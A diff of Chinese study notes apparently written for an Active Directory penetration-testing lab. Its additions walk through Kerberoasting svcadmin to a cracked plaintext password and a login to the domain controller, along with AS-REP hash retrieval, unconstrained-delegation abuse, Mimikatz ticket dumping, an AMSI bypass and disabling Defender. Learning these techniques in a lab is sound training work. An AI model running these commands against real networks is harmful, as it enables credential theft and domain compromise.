@@ -16,11 +16,25 @@ websvc            {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-admins
 svcadmin          {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
 ```
 
+尤其留意域管理员的信息，这里svcadmin开启了SQL server服务。
+
 因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet
 
+
+下面两条命令在学生shell下执行，如果报错了，可能是student VM的网络问题，重启一下
 ```
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+PS C:\ad> Add-Type -AssemblyName System.IdentityModel
+PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dolla
+rcorp.moneycorp.local"
+
+
+Id                   : uuid-396ea046-4707-42b5-aeca-14c64449d666-1
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/21/2022 7:06:53 AM
+ValidTo              : 2/21/2022 5:03:41 PM
+ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
 ```
 
 用klist命令
@@ -33,20 +47,20 @@ Current LogonId is 0:0x3114e90c
 Cached Tickets: (11)
 
 <略>
-#2>     Client: svcadmin @ DOLLARCORP.MONEYCORP.LOCAL
+#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
         Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
-        Start Time: 2/14/2022 22:56:27 (local)
-        End Time:   2/15/2022 7:04:38 (local)
-        Renew Time: 2/21/2022 1:34:38 (local)
+        Start Time: 2/20/2022 23:06:53 (local)
+        End Time:   2/21/2022 9:03:41 (local)
+        Renew Time: 2/27/2022 23:03:41 (local)
         Session Key Type: RSADSI RC4-HMAC(NT)
         Cache Flags: 0
         Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
 <略>
 ```
 
-有MSSQLSvc的TGS
+有MSSQLSvc的TGS。client就是学生账号student366
 
 用Mimikatz dump出tikets
 
@@ -54,21 +68,45 @@ Cached Tickets: (11)
  Invoke-Mimikatz -Command '"kerberos::list /export"'
 
  <略>
-[00000002] - 0x00000017 - rc4_hmac_nt
-   Start/End/MaxRenew: 2/14/2022 10:56:27 PM ; 2/15/2022 7:04:38 AM ; 2/21/2022 1:34:38 AM
+[00000001] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 2/20/2022 11:06:53 PM ; 2/21/2022 9:03:41 AM ; 2/27/2022 11:03:41 PM
    Server Name       : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
-   Client Name       : svcadmin @ DOLLARCORP.MONEYCORP.LOCAL
+   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
-   * Saved to file     : 2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+   * Saved to file     : 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
 <略>
 ```
 
-在当前目录生成了一个TGS文件```2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```
+在当前目录生成了一个TGS文件```1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```
 
 拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码
-
+执行命令：
 ```
-python.exe .\tgsrepcrack.py .\10k-worst-pass.txt
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+```
+
+爆破结果
+```
+PS C:\ad\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarco
+rp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+found password for ticket 0: *ThisisBlasphemyThisisMadness!!  File: 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp
+.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+All tickets cracked!
+```
+
+得到了svcadmin的明文密码
+```
+*ThisisBlasphemyThisisMadness!!
+```
+
+用上面的明文密码登陆dcorp-dc，输入明文密码后可以成功登录
+```
+PS C:\ad> Enter-PSSession –Computername dcorp-dc –credential dcorp\svcadmin
+[dcorp-dc]: PS C:\Users\svcadmin\Documents> whoami
+dcorp\svcadmin
+[dcorp-dc]: PS C:\Users\svcadmin\Documents> hostname
+dcorp-dc
+[dcorp-dc]: PS C:\Users\svcadmin\Documents>
 ```
 
 # Targeted Kerberoasting - AS-REPs（Kerberos 预身份验证）
@@ -120,7 +158,7 @@ IdentityReferenceClass  : group
 关闭以后获取这个用户的krb5哈希
 
 ```
- Get-ASREPHash -UserName Control359User -Verbose
+Get-ASREPHash -UserName Control359User -Verbose
 ```
 
 # Targeted Kerberoasting - Set SPN
@@ -210,7 +248,7 @@ Get-DomainUser -Identity Support370User | Get-DomainSPNTicket | select -ExpandPr
 
 ## 非约束委派
 
-枚举非约束委派计算机（Unconstrained Delegation）
+枚举非约束委派计算机（Unconstrained Delegation），使用powerview的dev版本
 ```
 PS C:\ad> Get-NetComputer -UnConstrained |select cn
 cn
@@ -220,6 +258,12 @@ DCORP-APPSRV
 ```
 
 枚举到两台计算机启用了无约束委派：dcorp-dc（DC服务器）和dcorp-appsrv
+
+什么是无约束委派？
+
+> 用户 A 去访问服务 B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问到的任意服务。
+
+在下面这个例子里用户 A是DA管理员Administrator，服务 B是机器dcorp-appsrv。由于Administrator访问过dcorp-appsrv，所以把自己的TGT发送给了dcorp-appsrv，那么dcorp-appsrv就能够利用DA管理员的身份去访问域内的任何服务。
 
 由于使用无约束委派的先决条件是有一个有本地管理权限的用户，
 我们需要攻陷DCORP-APPSRV这台机器上一个有本地管理员权限的用户
@@ -270,7 +314,7 @@ dcorp-std366.dollarcorp.moneycorp.local
 $sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
 ```
 
-在指定session里载入Mimikatz
+在指定session里载入Mimikatz（这里如果不能载入，可以多试几次直接```Enter-PSSession $sess```,进去以后直接bypass掉AMSI）
 ```
 Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
 ```
@@ -288,8 +332,7 @@ PS C:\ad> Enter-PSSession $sess
 
 用Mimikatz导出所有令牌，看看是否有Administrator的令牌
 ```
-[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"sekurlsa::
-tickets /export"'
+[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
   .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
@@ -391,7 +434,7 @@ Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Sess
 
 把Rubeus.exe拷贝到dcorp-appsrv
 ```
-Copy-Item -ToSession $appsrv1 -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
+Copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
 ```
 
 进到dcorp-appsrv，运行Rubeus.exe，这个shell不要关闭
